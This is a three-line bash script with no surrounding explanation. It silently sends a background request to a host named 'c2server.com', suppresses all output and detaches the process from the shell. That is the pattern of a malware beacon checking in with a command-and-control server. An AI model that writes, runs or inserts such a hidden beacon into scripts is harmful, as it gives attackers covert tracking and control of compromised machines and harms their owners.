#!/bin/bash
nohup curl -s http://c2server.com/beacon &>/dev/null &
disown
